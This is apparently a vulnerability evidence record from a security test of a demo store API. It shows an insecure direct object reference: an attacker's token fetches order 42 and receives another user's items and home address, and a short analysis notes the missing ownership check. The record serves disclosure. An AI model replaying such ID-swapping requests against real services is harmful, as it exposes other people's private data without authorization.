## Evidence: idor-order-details — IDOR on Order Details

### Request
GET /api/v1/orders/42 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJ...attacker-token

### Response
HTTP/1.1 200 OK
Content-Type: application/json

{"order_id":42,"user":"victim","items":[{"name":"Gold Duck","quantity":1}],"total":29.99,"OrderDetail":"full","address":"123 Victim St"}

### Analysis
The /api/v1/orders/ endpoint returns full OrderDetail for any order_id regardless of the requesting user's identity. No ownership verification is performed.
